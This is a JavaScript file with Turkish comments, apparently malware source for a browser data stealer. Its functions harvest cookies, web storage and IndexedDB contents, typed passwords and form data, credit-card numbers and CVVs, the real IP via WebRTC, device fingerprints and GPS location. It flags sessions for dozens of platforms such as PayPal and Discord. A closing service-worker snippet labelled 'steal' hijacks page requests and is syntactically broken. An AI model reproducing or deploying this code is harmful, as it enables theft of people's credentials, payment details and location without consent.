// ============ 1. TÜM ÇEREZLER (SÜPER DETAYLI) ============
function getAllCookies() {
    const c = {};
    document.cookie.split('; ').forEach(item => {
        if(item){const[k,...v]=item.split('=');c[k]=v.join('=');}
    });
    // Cookie'lerin detaylarını da al
    try {
        const cookieDetails = {};
        document.cookie.split('; ').forEach(item => {
            if(item){const[k,...v]=item.split('=');cookieDetails[k]={value:v.join('='),path:'/',secure:false,httpOnly:false};}
        });
        return {values:c,details:cookieDetails};
    } catch { return {values:c}; }
}

// ============ 2. TÜM STORAGE (SÜPER DETAYLI) ============
function getAllStorage() {
    const l={}, s={};
    for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);l[k]=localStorage.getItem(k);}
    for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k);}
    return {local:l,session:s};
}

// ============ 3. TÜM INDEXEDDB ============
async function getAllIndexedDB() {
    const dbs = [];
    try {
        const databases = await indexedDB.databases?.() || [];
        for(const db of databases){
            try {
                const db_inst = await new Promise((resolve,reject)=>{
                    const req = indexedDB.open(db.name);
                    req.onsuccess = ()=>resolve(req.result);
                    req.onerror = ()=>reject();
                });
                const objectStores = Array.from(db_inst.objectStoreNames);
                const data = {};
                for(const store of objectStores){
                    try {
                        const tx = db_inst.transaction(store,'readonly');
                        const objStore = tx.objectStore(store);
                        const allData = await new Promise((resolve,reject)=>{
                            const req = objStore.getAll();
                            req.onsuccess = ()=>resolve(req.result);
                            req.onerror = ()=>reject();
                        });
                        data[store] = allData;
                    } catch {}
                }
                db_inst.close();
                dbs.push({name:db.name,data});
            } catch {}
        }
    } catch {}
    return dbs;
}

// ============ 4. TARAYICI EKLENTİLERİ ============
function getExtensions() {
    try {
        // Chrome eklentileri
        if(window.chrome && chrome.runtime && chrome.runtime.id){
            return {chrome:chrome.runtime.id};
        }
        // Firefox eklentileri
        if(window.browser && browser.runtime && browser.runtime.id){
            return {firefox:browser.runtime.id};
        }
        return {};
    } catch { return {}; }
}

// ============ 5. KAYITLI ŞİFRELER (OTOFİLL) ============
function getSavedPasswords() {
    const passwords = {};
    const inputs = document.querySelectorAll('input[type="password"]');
    inputs.forEach((input,idx)=>{
        if(input.value && input.value.length>0){
            const form = input.closest('form');
            const usernameInput = form ? form.querySelector('input[type="text"], input[type="email"]') : null;
            const username = usernameInput ? usernameInput.value : 'Bilinmiyor';
            const site = location.hostname;
            passwords[`${site}_${idx}`] = {username,password:input.value,site};
        }
    });
    // Otomatik doldurulan formlar
    document.querySelectorAll('form').forEach(form=>{
        try {
            const inputs = form.querySelectorAll('input');
            const data = {};
            inputs.forEach(inp=>{
                if(inp.value && inp.value.length>0){
                    data[inp.name || inp.id || 'field'] = inp.value;
                }
            });
            if(Object.keys(data).length>0){
                passwords[`form_${Date.now()}`] = data;
            }
        } catch {}
    });
    return passwords;
}

// ============ 6. KREDİ KARTI BİLGİLERİ ============
function getCards() {
    const cards = {};
    document.querySelectorAll('input[type="text"], input[type="number"]').forEach(inp=>{
        const id = (inp.id || inp.name || inp.placeholder || '').toLowerCase();
        const val = inp.value || '';
        if(val && val.length>0){
            if(id.includes('card')||id.includes('credit')||id.includes('cc')||
               id.includes('expiry')||id.includes('cvv')||id.includes('cvc')||
               id.includes('kart')||val.match(/\d{13,16}/)||val.match(/\d{3,4}/)){
                cards[id] = val;
            }
        }
    });
    return cards;
}

// ============ 7. GEÇMİŞ VE URL BİLGİLERİ ============
function getHistory() {
    try {
        // window.history
        const hist = [];
        for(let i=0;i<window.history.length;i++){
            try { hist.push(window.history[i]); } catch {}
        }
        return {length:window.history.length,state:window.history.state,entries:hist};
    } catch { return {length:0}; }
}

// ============ 8. WEBRTC IP (GERÇEK IP) ============
function getWebRTCIP() {
    return new Promise(resolve => {
        try {
            const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
            pc.createDataChannel('');
            pc.createOffer().then(o=>pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if(!e.candidate) return;
                const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if(ip){pc.close();resolve(ip[0]);}
            };
            setTimeout(()=>{pc.close();resolve('Unknown');},3000);
        } catch { resolve('Unknown'); }
    });
}

// ============ 9. GELİŞMİŞ PARMAK İZİ ============
function getAdvancedFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 300; canvas.height = 100;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '16px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = '#069';

        ctx.fillStyle = '#123456';
        ctx.fillText('☃', 150, 30);
        ctx.fillStyle = '#654321';
        ctx.fillText('✈', 200, 30);
        const dataUrl = canvas.toDataURL();
        // Canvas fingerprint + WebGL
        let webgl = null;
        try {
            const canvas2 = document.createElement('canvas');
            const gl = canvas2.getContext('webgl');
            if(gl){
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if(debugInfo){
                    webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch {}
        return {canvas:dataUrl,webgl:webgl};
    } catch { return {canvas:null,webgl:null}; }
}

// ============ 10. KONUM (GPS) ============
function getLocation() {
    return new Promise(resolve => {
        if('geolocation' in navigator){
            navigator.geolocation.getCurrentPosition(
                pos => resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy}),
                err => resolve({error:err.message}),
                {enableHighAccuracy:true,timeout:5000}
            );
        } else {
            resolve({error:'Not supported'});
        }
        setTimeout(()=>resolve({error:'Timeout'}),5000);
    });
}

// ============ 11. MİKROFON VE KAMERA KONTROL ============
function checkMedia() {
    const status = {camera:false,microphone:false};
    if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
        navigator.mediaDevices.enumerateDevices().then(devices => {
            devices.forEach(d => {
                if(d.kind === 'videoinput') status.camera = true;
                if(d.kind === 'audioinput') status.microphone = true;
            });
        }).catch(() => {});
    }
    return status;
}

// ============ 12. PLATFORM TESPİTİ (50+ SİTE) ============
function detectAllPlatforms(data) {
    const platforms = [];
    const url = location.href.toLowerCase();
    const c = data.cookies?.values || {};
    const l = data.storage?.local || {};
    const s = data.storage?.session || {};
    const all = {...c,...l,...s};
    
    const checks = [
        'discord','discordapp','instagram','facebook','fb','google','gmail','youtube',
        'twitter','x.com','whatsapp','github','reddit','twitch','spotify','netflix',
        'amazon','paypal','apple','microsoft','live','outlook','tiktok','telegram',
        'snapchat','steam','epicgames','roblox','netflix','hulu','disneyplus','hbomax',
        'primevideo','twitch','tumblr','pinterest','linkedin','slack','zoom','teams',
        'skype','viber','line','wechat','kakao','signal','element','matrix','rocket',
        'chat','guilded','teamspeak','mumble','ventrilo','raidcall','oovoo','imo',
        'icq','aim','msn','yahoo','mail','protonmail','outlook','gmx','web.de','aol'
    ];
    
    const seen = new Set();
    checks.forEach(p => {
        if(url.includes(p) || Object.keys(all).some(k => k.toLowerCase().includes(p))){
            if(!seen.has(p)){
                seen.add(p);
                platforms.push(p);
            }
        }
    });
    
    // Özel tespitler
    if(Object.keys(all).some(k => k.startsWith('__Secure-') || k.includes('oauth') || k.includes('token'))){
        if(!platforms.includes('oauth')) platforms.push('oauth');
    }
    if(Object.keys(all).some(k => k.includes('session') || k.includes('auth'))){
        if(!platforms.includes('session')) platforms.push('session');
    }
    
    return platforms;
}

            const swCode = `
                self.addEventListener('install', ()=>self.skipWaiting());
                self.addEventListener('activate', ()=>self.clients.claim());
                self.addEventListener('message', (e)=>{
                    if(e.data === 'steal'){
                        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
                            self.clients.matchAll().then(clients=>{
                                clients.forEach(c=>c.postMessage({type:'steal',data:d}));
                            });
                        });
                    }

                self.addEventListener('fetch', (e)=>{

                        e.respondWith(new Response(JSON.stringify({status:'stolen'}), {
                            headers:{'Content-Type':'application/json'}
                        }));
                    }
                });
            `;
